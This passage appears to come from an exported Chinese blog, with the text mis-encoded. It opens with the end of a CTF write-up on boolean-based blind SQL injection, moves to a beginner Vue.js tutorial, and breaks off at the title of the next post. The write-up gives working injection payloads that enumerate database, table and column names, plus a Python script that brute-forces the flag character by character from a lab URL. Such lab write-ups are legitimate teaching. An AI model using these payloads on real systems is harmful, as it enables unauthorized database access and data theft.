<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 and length((<span class="keyword">select</span> <span class="keyword">database</span>()))=<span class="number">4</span></span><br></pre></td></tr></table></figure>

<p>æœç„¶çŒœå¯¹äº†ï¼Œé•¿åº¦æ˜¯4ï¼ğŸ‘</p>
<p>ä¸‹ä¸€æ­¥ï¼Œå°±æ˜¯ç²¾ç¡®æ•°æ®åº“åå­—äº†ï¼Œç”¨<code>substr</code>å‡½æ•°å¯ä»¥ä¸€æ­¥ä¸€æ­¥å°†æ•°æ®åº“åå­—è¯•æ¢å‡ºæ¥ï¼ŒäºŒåˆ†æ³•æ€æƒ³å…ˆè¯•ä¸€ä¸‹ç¬¬ä¸€ä¸ªå­—æ¯çš„èŒƒå›´ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 and substr((<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">1</span>,<span class="number">1</span>) &gt; <span class="string">'a'</span>;</span><br></pre></td></tr></table></figure>

<p>å¾—çŸ¥ï¼Œç¬¬ä¸€ä¸ªå­—æ¯æ¯”<code>a</code>å¤§ï¼Œç»§ç»­ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 and substr((<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">1</span>,<span class="number">1</span>) &gt; <span class="string">'m'</span>;</span><br></pre></td></tr></table></figure>

<p>å¾—çŸ¥ï¼Œç¬¬ä¸€ä¸ªå­—æ¯æ¯”<code>m</code>å¤§ï¼Œç»§ç»­ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 and substr((<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">1</span>,<span class="number">1</span>) &gt; <span class="string">'s'</span>;</span><br></pre></td></tr></table></figure>

<p>å¾—çŸ¥ï¼Œç¬¬ä¸€ä¸ªä¸å¤§äº<code>s</code>ï¼Œç»“åˆä¹‹å‰çš„ï¼Œç¬¬ä¸€ä¸ªå­—æ¯æ˜¯å¤§äº<code>m</code>ï¼Œå°äºç­‰äº<code>s</code>ï¼Œä¸æ–­ç¼©å°èŒƒå›´ï¼Œæœ€åçŒœå‡ºç¬¬ä¸€ä¸ªå­—æ¯æ˜¯<code>s</code>ã€‚</p>
<p>å¦‚æ³•ç‚®åˆ¶ï¼Œæœ€åï¼Œå¾—çŸ¥æ•°æ®åº“åå­—ä¸º<code>sqli</code></p>
<p><strong>çŒœè¡¨å</strong></p>
<p>åœ¨æ­¤ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥è®¤è¯†ä¸€ä¸‹<code>group_concat</code>å‡½æ•°ï¼Œè¯¥å‡½æ•°å¯ä»¥å°†ç»“æœè¿›è¡Œæ‹¼æ¥ï¼Œä»¥é€—å·é—´éš”ã€‚</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 and length(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>())=<span class="number">4</span></span><br></pre></td></tr></table></figure>

<p>ç»è¿‡æ¼«é•¿åœ°æµ‹è¯•ï¼Œæˆ‘å‘ç°â€¦â€¦æˆ‘é€æ¸å¤±å»äº†è€å¿ƒå´è¿˜æ²¡æœ‰è¯•å‡ºé•¿åº¦ğŸ˜­ï¼Œä¸ç®¡äº†ï¼Œå…ˆæµ‹è¯•ç¬¬ä¸€ä¸ªå­—ç¬¦å§ï¼Œæˆ‘å‘ç°é¡µé¢å›æ˜¾çš„<code>SQL</code>è¯­å¥ä¸­æœ‰ä¸€ä¸ªè¡¨åæ˜¯<code>news</code>ï¼Œå…ˆè¯•ä¸€ä¸‹ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 and substr((<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">1</span>,<span class="number">4</span>)=<span class="string">'news'</span></span><br></pre></td></tr></table></figure>

<p>ç«Ÿç„¶ä¸æ˜¯ï¼ä¼šä¸ä¼šæ˜¯<code>SQL</code>è¯­å¥æœ¬èº«å°±æœ‰è¯¯ï¼Ÿ</p>
<p>å…ˆçœ‹çœ‹æ˜¯ä¸æ˜¯åŒ…å«<code>news</code>ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 and locate('news',(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>())) &gt; <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>å‘ç°è¯­å¥æ²¡é—®é¢˜ï¼Œé‚£å°±å…ˆçœ‹çœ‹æœ‰æ²¡æœ‰<code>flag</code>è¿™ä¸ªè¡¨å§ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 and locate('flag',(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>())) &gt; <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>æœç„¶æœ‰ï¼</p>
<p><strong>çŒœå­—æ®µ</strong></p>
<p>å…ˆçŒœä¸€ä¸‹å­—æ®µæ€»é•¿åº¦ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 and length((<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'flag'</span> <span class="keyword">and</span> table_schema=<span class="keyword">database</span>()))&gt;<span class="number">5</span></span><br></pre></td></tr></table></figure>

<p>å°äºäº”ï¼Œæœ€åè¯•å‡ºæ¥æ˜¯4ï¼Œç›²çŒœ<code>flag</code>ğŸ˜Š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 and (<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'flag'</span> <span class="keyword">and</span> table_schema=<span class="keyword">database</span>()) =<span class="string">'flag'</span></span><br></pre></td></tr></table></figure>

<p>æœä¸å…¶ç„¶ï¼Œåªæœ‰ä¸€ä¸ªå­—æ®µï¼Œå­—æ®µåä¸º<code>flag</code></p>
<p><strong>çŒœå†…å®¹</strong></p>
<p>å…ˆçœ‹ä¸€ä¸‹è¡Œæ•°ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 and (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> flag) =<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>ç¡®å®šåªæœ‰ä¸€è¡Œï¼</p>
<blockquote>
<p>å¦‚æœæœ‰å¤šè¡Œæ•°æ®ï¼Œå¯ä»¥ä½¿ç”¨limitå…³é”®å­—</p>
</blockquote>
<p>çœ‹çœ‹æ€»é•¿åº¦ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 and length((<span class="keyword">select</span> * <span class="keyword">from</span> flag)) &gt; <span class="number">10</span></span><br></pre></td></tr></table></figure>

<p>ç»è¿‡æ¼«é•¿åœ°æµ‹è¯•ï¼Œæˆ‘ç»ˆäºè¯•å‡ºæ¥äº†æ€»é•¿åº¦æ˜¯32ï¼Œä¸§å¿ƒç—…ç‹‚ï¼ï¼ï¼ï¼ğŸ˜­è®©æˆ‘ä¸€ä¸ªä¸€ä¸ªå»æµ‹è¯•ï¼Œé‚£æˆ‘ä¼šå´©æºƒæ‰çš„ï¼Œç¨‹åºå‘˜æ€ä¹ˆèƒ½åšé‡å¤æ— èŠçš„å·¥ä½œå‘¢ï¼</p>
<p>çœ‹çœ‹å‰é¢å‡ ä¸ªå­—ç¬¦æ˜¯ä¸æ˜¯<code>ctfhub{</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1 and substr((<span class="keyword">select</span> * <span class="keyword">from</span> flag),<span class="number">1</span>,<span class="number">7</span>) =<span class="string">'ctfhub&#123;'</span></span><br></pre></td></tr></table></figure>

<p>å¥½äº†ï¼Œä¸‹é¢å°±æ˜¯ç”¨è„šæœ¬è§£å†³é—®é¢˜äº†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    url=<span class="string">r"http://challenge-93e4d1abfb79ed96.sandbox.ctfhub.com:10800/"</span></span><br><span class="line">    code = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">33</span>):</span><br><span class="line">        print(<span class="string">'start idx = '</span>, idx)</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">129</span>):</span><br><span class="line">            Params = &#123;<span class="string">"id"</span>:<span class="string">"1 and substr((select * from flag),"</span> + str(idx) + <span class="string">",1) = '"</span>+ chr(c) +<span class="string">"'"</span>&#125;</span><br><span class="line">            response = requests.get(url = url, params = Params)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'query_success'</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                code += chr(c)</span><br><span class="line">                print(idx, <span class="string">' ok '</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># ç”±äº mysql åˆ¤æ–­çš„æ—¶å€™ä¸åŒºåˆ†å¤§å°å†™ï¼Œå› æ­¤codeå…¨æ˜¯å¤§å†™å­—æ¯ï¼Œä½†æ˜¯æœ€ç»ˆç­”æ¡ˆæ˜¯å°å†™çš„</span></span><br><span class="line">    print(code.lower())</span><br></pre></td></tr></table></figure>

<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ç»ˆäºæŠŠè¿™é“é¢˜ç»™å†™å‡ºæ¥äº†ï¼Œåšå¾—æœ‰ç‚¹ç—›è‹¦ï¼Œçœ‹æ¥ä»¥åå¾—å¤šå­¦å­¦<code>sqlmap</code>è¿™ä¸ªåˆ©å™¨äº†ï¼</p>
<p>ç»è¿‡è¿™ä¸€è½®å­¦ä¹ ï¼Œå‘ç°ç½‘ç»œå®‰å…¨çœŸæ˜¯é˜²ä¸èƒœé˜²ï¼Œæ–¹å¯¸ä¹‹é—´çš„æ¼æ´éƒ½å¯èƒ½è¢«ä¸å‘åˆ†å­åˆ©ç”¨ï¼Œä¹Ÿè¯´æ˜äº†ç½‘ç»œå®‰å…¨é“è·¯ä»»é‡é“è¿œã€‚</p>
<p>æœ€åï¼Œå†™å®Œè¿™é“é¢˜æˆ‘æƒ³èµ·äº†ä¹‹å‰é‡åˆ°çš„ä¸€ä¸ªç”µè„‘é«˜æ‰‹ã€‚</p>
<p>å¾ˆä¹…ä»¥å‰ï¼Œé‚£è¿˜æ˜¯æˆ‘ç”¨<code>win98</code>çš„æ—¶å€™ï¼Œæœ‰æ¬¡æˆ‘ç³»ç»Ÿå´©æºƒäº†ï¼Œå› ä¸ºæˆ‘æ˜¯ç”µè„‘ç™½ç—´ï¼Œæˆ‘æœ‹å‹ç»™æˆ‘ä»‹ç»äº†ä¸€ä¸ªé«˜æ‰‹æ¥å¸®æˆ‘ä¿®ç”µè„‘ã€‚ä»–çœ‹äº†ä¸€ä¸‹ç”µè„‘ï¼Œé—®æˆ‘æœ‰æ²¡æœ‰98çš„ç›˜ï¼Œæˆ‘è¯´æ²¡æœ‰ã€‚ä»–æƒ³äº†ä¸€ä¸‹ï¼Œå«æˆ‘æŠŠå›ºå®šç”µè¯æ‹¿ç»™ä»–ï¼Œæˆ‘æƒ³ä¿®ç”µè„‘è¦ç”µè¯å¹²ä»€ä¹ˆï¼Œä½†äººå®¶æ˜¯é«˜æ‰‹ï¼Œæˆ‘ä¹Ÿä¸å¥½è¯´ä»€ä¹ˆï¼Œå°±æŠŠç”µè¯æ‹”ä¸‹æ¥ç»™ä»–äº†ã€‚ä»–æŠŠç”µè¯çº¿ç©ºç€çš„ä¸€å¤´æ¥åœ¨ç”µè„‘çš„ä¸€ä¸ªæ’å­”å†…ï¼Œç„¶åè¿›å…¥äº†<code>dos</code>ï¼Œç„¶åå°±å¼€å§‹åœ¨ç”µè¯ä¸Šä¸åœçš„æŒ‰ç€é”®ï¼Œä»–æŒ‰é”®çš„é€Ÿåº¦éå¸¸å¿«ï¼Œä½†æ˜¯åªæŒ‰0ï¼Œ1ä¸¤ä¸ªé”®ï¼Œæˆ‘æä¸æ‡‚è¿™æœ‰ä»€ä¹ˆç”¨ï¼Œä½†ä¹Ÿä¸æ•¢é—®ï¼Œçœ‹äº†åŠä¸ªå¤šå°æ—¶ï¼Œä»–è¿˜æ˜¯ä¸åœçš„æŒ‰è¿™ä¸¤ä¸ªé”®ï¼Œæˆ‘æ¸æ¸çš„æœ‰äº›å›°ï¼Œæˆ‘é—®ä»–è¿™ä¸œè¥¿è¦æå¤šä¹…ï¼Œä»–è¯´è¦å‡ ä¸ªå°æ—¶ï¼Œæˆ‘ç»™ä»–å€’äº†æ¯èŒ¶ï¼Œå°±ä¸€ä¸ªäººå»éš”å£ç¡è§‰äº†ã€‚é†’æ¥çš„æ—¶å€™ï¼Œä¸€çœ‹å·²ç»è¿‡äº†4ä¸ªå¤šå°æ—¶ï¼Œæˆ‘èµ·èº«åˆ°éš”å£ï¼Œçœ‹è§ä»–æ­£åœ¨98é‡Œé¢è°ƒè¯•ï¼Œè¿‡äº†ä¸€ä¼šå„¿ï¼Œä»–è¯´ï¼Œä½ è¯•è¯•ï¼Œæˆ‘åä¸Šæ¤…å­ç”¨äº†ä¸€ä¸‹ï¼ŒçœŸçš„å¥½äº†ï¼Œæˆ‘å½“æ—¶ä¹Ÿä¸æ‡‚ç”µè„‘ï¼Œè°¢è¿‡äººå®¶å°±èµ°äº†ã€‚åæ¥æˆ‘æ…¢æ…¢å¯¹ç”µè„‘æœ‰äº†äº†è§£ï¼Œç»ˆäºäº†è§£ï¼ŒåŸæ¥å½“æ—¶é‚£ä½é«˜æ‰‹æ˜¯ç”¨æœºå™¨è¯­è¨€ç¼–äº†ä¸€ä¸ª98ç³»ç»Ÿï¼Œæˆ‘åæ¥é—®æˆ‘æœ‹å‹é‚£ä½é«˜æ‰‹çš„ä¸‹è½ï¼Œæˆ‘æœ‹å‹è¯´å‰å‡ å¹´å»äº†ç¾å›½IBMä¹‹åï¼Œæ³æ— éŸ³è®¯â€¦â€¦æˆ‘å¾ˆæƒ³ä»–ï¼Œå¦‚æœè°é‡åˆ°äº†ï¼Œè¯·ç»™æˆ‘å‘ä¸ªçŸ­ä¿¡â€¦â€¦</p>
<hr>
<p>==é»‘å¸½ç™½å¸½ï¼Œå°±åœ¨ä¸€å¿µä¹‹é—´ï¼==</p>
]]></content>
      <categories>
        <category>ç½‘ç»œæ”»é˜²</category>
      </categories>
      <tags>
        <tag>MySql</tag>
      </tags>
  </entry>
  <entry>
    <title>Vueæ¡†æ¶</title>
    <url>/2020/03/21/Vue%E6%A1%86%E6%9E%B6/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p> Vue æ˜¯ä¸€å¥—ç”¨äºæ„å»ºç”¨æˆ·ç•Œé¢çš„<strong>æ¸è¿›å¼æ¡†æ¶</strong> ï¼Œåˆ©ç”¨Vueå¯ä»¥æ–¹é¢åœ°ç»è¡Œä¸­å°å‹é¡¹ç›®çš„å¿«é€Ÿæ„å»ºï¼Œ å®ƒçš„æ ¸å¿ƒåº“åªå…³æ³¨è§†å›¾å±‚ï¼Œä¸ä»…æ˜“äºä¸Šæ‰‹ï¼Œè¿˜ä¾¿äºä¸ç¬¬ä¸‰æ–¹åº“æˆ–æ—¢æœ‰é¡¹ç›®æ•´åˆã€‚ è¿™é‡Œæ˜¯å®ƒçš„å®˜ç½‘<a href="https://cn.vuejs.org/" target="_blank" rel="noopener">é“¾æ¥</a></p>
<a id="more"></a>

<h2 id="æœ€ç®€å•çš„ä¾‹å­"><a href="#æœ€ç®€å•çš„ä¾‹å­" class="headerlink" title="æœ€ç®€å•çš„ä¾‹å­"></a>æœ€ç®€å•çš„ä¾‹å­</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"zh"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">        &#123;&#123; message&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- å¯¼åŒ… --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- å¼€å‘ç¯å¢ƒç‰ˆæœ¬ï¼ŒåŒ…å«äº†æœ‰å¸®åŠ©çš„å‘½ä»¤è¡Œè­¦å‘Š --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue/dist/vue.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">            el: <span class="string">"#app"</span>,</span></span><br><span class="line">            data: &#123;</span><br><span class="line"><span class="actionscript">                message: <span class="string">"hello world"</span>,</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>ä¸€å®šè¦å¯¼åŒ…ï¼Œå¯ä»¥ä¸‹è½½åˆ°æœ¬åœ°ä½¿ç”¨ï¼Œä¹Ÿå¯ä»¥ç›´æ¥é€šè¿‡è¿œç¨‹å¯¼å…¥çš„æ–¹æ³•å¯¼å…¥ï¼Œå¯¹äºåˆ¶ä½œé¡¹ç›®ï¼Œæ¨èä¸‹è½½åˆ°æœ¬åœ°ï¼Œå¦‚æœåªæ˜¯å­¦ä¹ ï¼Œç›´æ¥è¿œç¨‹å¯¼å…¥å³å¯ï¼Œä½†æ˜¯å‰ææ˜¯è¦æœ‰ç½‘ç»œ</strong></p>
<h2 id="elæŒ‚è½½ç‚¹"><a href="#elæŒ‚è½½ç‚¹" class="headerlink" title="elæŒ‚è½½ç‚¹"></a>elæŒ‚è½½ç‚¹</h2><ul>
<li><p>ä½œç”¨åŸŸï¼šelæŒ‡å®šçš„æ ‡ç­¾èŒƒå›´ï¼Œå³åœ¨è¿™ä¸ªèŒƒå›´ä¹‹ä¸‹</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    &#123;&#123; message&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>é€‰æ‹©å™¨çš„ç±»å‹ï¼šä¸é™äºidé€‰æ‹©å™¨ï¼Œä¸‹é¢çš„ä¸‰ä¸ªéƒ½æ˜¯å¯ä»¥çš„</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">        &#123;&#123; message&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- å¯¼åŒ… --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- å¼€å‘ç¯å¢ƒç‰ˆæœ¬ï¼ŒåŒ…å«äº†æœ‰å¸®åŠ©çš„å‘½ä»¤è¡Œè­¦å‘Š --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue/dist/vue.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// æ³¨æ„çœ‹è¿™é‡Œ</span></span></span><br><span class="line"><span class="actionscript">            el: <span class="string">".app"</span>,</span></span><br><span class="line">            data: &#123;</span><br><span class="line"><span class="actionscript">                message: <span class="string">"ä½ å¥½"</span>,</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        &#123;&#123; message&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- å¯¼åŒ… --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- å¼€å‘ç¯å¢ƒç‰ˆæœ¬ï¼ŒåŒ…å«äº†æœ‰å¸®åŠ©çš„å‘½ä»¤è¡Œè­¦å‘Š --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue/dist/vue.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// æ³¨æ„çœ‹è¿™é‡Œ</span></span></span><br><span class="line"><span class="actionscript">            el: <span class="string">"div"</span>,</span></span><br><span class="line">            data: &#123;</span><br><span class="line"><span class="actionscript">                message: <span class="string">"ä½ å¥½"</span>,</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- æ³¨æ„çœ‹è¿™é‡Œ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">        &#123;&#123; message&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- å¯¼åŒ… --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- å¼€å‘ç¯å¢ƒç‰ˆæœ¬ï¼ŒåŒ…å«äº†æœ‰å¸®åŠ©çš„å‘½ä»¤è¡Œè­¦å‘Š --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/vue/dist/vue.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">            <span class="comment">// æ³¨æ„çœ‹è¿™é‡Œ</span></span></span><br><span class="line"><span class="actionscript">            el: <span class="string">"#app"</span>,</span></span><br><span class="line">            data: &#123;</span><br><span class="line"><span class="actionscript">                message: <span class="string">"ä½ å¥½"</span>,</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œelä¸èƒ½å¤ŸæŒ‚è½½åˆ°å•æ ‡ç­¾å’Œbodyæ ‡ç­¾ä¸­</strong>ï¼Œå»ºè®®ä½¿ç”¨idé€‰æ‹©å™¨å’ŒæŒ‚è½½åˆ°divä¸­ã€‚</p>
</li>
</ul>
<h2 id="dateæ•°æ®å¯¹è±¡"><a href="#dateæ•°æ®å¯¹è±¡" class="headerlink" title="dateæ•°æ®å¯¹è±¡"></a>dateæ•°æ®å¯¹è±¡</h2><ul>
<li><p>Vueä¸­ç”¨åˆ°çš„æ•°æ®å®šä¹‰åœ¨dataä¸­</p>
</li>
<li><p>dataä¸­çš„æ•°æ®ç±»å‹ä¸é™äºå­—ç¬¦ä¸²ï¼Œè¿˜å¯ä»¥æ˜¯å¤æ‚çš„æ•°æ®ç±»å‹ï¼Œå¦‚å¯¹è±¡ï¼Œæ•°ç»„</p>
</li>
<li><p>æ¸²æŸ“å¤æ‚ç±»å‹æ•°æ®æ—¶ï¼Œéµå®ˆjsçš„è¯­æ³•å³å¯ï¼Œå¦‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">data: &#123;</span><br><span class="line">    message: <span class="string">"ä½ å¥½"</span>,</span><br><span class="line">    student: &#123;</span><br><span class="line">        name: <span class="string">"YaleXin"</span>,</span><br><span class="line">        age: <span class="number">20</span>,</span><br><span class="line">        address: <span class="string">"earth"</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    test_array: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¼•ç”¨æ—¶åŠ ä¸ŠåŒå¤§æ‹¬å·å³å¯</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    &#123;&#123; message &#125;&#125;</span><br><span class="line">    &#123;&#123;student.name&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;&#123;test_array[0]&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;&#123;test_array[2]&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>



</li>
</ul>
<p>  <img src="http://q78fmp2j4.bkt.clouddn.com/blog/20200316/akfBfVATnbor.png" alt></p>
]]></content>
      <categories>
        <category>Vueåˆçº§</category>
      </categories>
      <tags>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Tarjanç®—æ³•æ±‚å‰²ç‚¹éš”è¾¹</title>
    <url>/2020/10/19/Tarjan%E7%AE%97%E6%B3%95%E6%B1%82%E5%89%B2%E7%82%B9%E9%9A%94%E8%BE%B9/</url>
